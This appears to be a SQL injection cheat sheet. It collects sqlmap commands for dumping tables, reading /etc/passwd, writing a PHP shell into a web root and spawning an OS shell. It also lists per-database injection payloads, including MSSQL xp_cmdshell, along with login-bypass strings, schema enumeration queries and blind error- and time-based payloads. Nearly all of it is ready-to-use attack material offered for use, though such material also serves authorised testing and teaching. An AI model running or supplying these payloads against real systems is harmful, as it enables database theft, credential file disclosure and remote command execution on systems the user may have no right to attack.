## SQL Injection

### SQLMap

**Note**: Might need to remove some techniques, for example, remove `T` if you want not to test for timing based SQLi.


#### Best Command
```
sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 -D <db_name> -T <table_name> --dump --technique=BEUSTQ
```

#### Check for DBA Privileges
```
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

#### Reading Local File
```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

#### Writing a file
```
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

#### Spawining OS Shell
```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

### Detection

#### General

```
{payload}--
{payload};--
{payload}#
'||{payload}--
'||{payload}#
"{payload}--
"{payload}#
' AND {payload}--
' OR {payload}--
' AND EXISTS({payload})--
' OR EXISTS({payload})--
```

#### MySQL
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'||{payload}--
"||{payload}--
'||(SELECT {payload})--
"||(SELECT {payload})--
```

#### PostgreSQL
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
```

#### Oracle
```
' UNION ALL SELECT {payload} FROM dual--
' UNION SELECT {payload} FROM dual--
' OR (SELECT {payload} FROM dual) IS NOT NULL--
' OR (SELECT {payload} FROM dual) IS NULL--
'||({payload})--
'||{payload}||'--
"||{payload}||"--
'||(SELECT {payload} FROM dual)--
```


#### MSSQL
```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' UNION SELECT null, @@version--
'; EXEC xp_cmdshell 'whoami'--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'+{payload}+
"+{payload}+
'+'+(SELECT {payload})+
"+"+(SELECT {payload})+
```

### Auth Bypass

```
admin ' or '1'='1
admin')-- -
' or 1=1 limit 1 --
'--+
```

### Database version
#### Oracle
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

#### MSSQL
```
SELECT @@version
```

#### PostgreSQL
```
SELECT version()
```

#### MySQL
```
SELECT @@version
```

### Database Enumeration

#### Oracle
```
SELECT * FROM all_tables 
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

#### MSSQL
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
#### PostgreSQL
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
#### MySQL
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
### Conditional Errors

#### Oracle
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

#### MSSQL
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

#### PostgreSQL
```
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
```

#### MySQL
```
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```
### Conditional Time Delays

#### Oracle
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
#### MSSQL
```
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
'; WAITFOR DELAY '00:00:05'--
```

#### PostgreSQL
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

#### MySQL
```
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```